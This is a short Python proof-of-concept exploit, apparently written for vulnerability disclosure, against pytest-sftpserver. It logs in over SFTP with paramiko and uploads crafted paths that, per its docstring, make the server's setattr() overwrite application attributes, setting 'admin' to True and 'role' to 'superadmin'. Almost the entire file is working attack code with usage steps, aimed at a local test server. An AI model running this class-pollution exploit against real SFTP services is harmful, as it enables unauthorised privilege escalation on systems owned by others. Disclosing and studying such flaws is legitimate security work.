"""
Remote class pollution PoC against pytest-sftpserver.

An SFTP client uploads a file whose path traverses the content object's
attributes via _find_object_for_path, then put() calls setattr() on the
resolved object, allowing arbitrary attribute writes on reachable objects.

Usage:
    1. Start the server: python app/main.py
    2. Run this PoC: python poc-pollution.py
"""
import paramiko

HOST = "127.0.0.1"
PORT = 3373

def run_poc():
    transport = paramiko.Transport((HOST, PORT))
    transport.connect(username="user", password="pass")
    sftp = paramiko.SFTPClient.from_transport(transport)

    print("[*] Writing to /state/admin to pollute AppState.admin attribute...")
    sftp.putfo(
        fl=__import__("io").BytesIO(b"True"),
        remotepath="/state/admin"
    )

    print("[*] Writing to /state/role to pollute AppState.role attribute...")
    sftp.putfo(
        fl=__import__("io").BytesIO(b"superadmin"),
        remotepath="/state/role"
    )

    sftp.close()
    transport.close()
    print("[+] Class pollution payloads delivered via SFTP put.")

if __name__ == "__main__":
    run_poc()
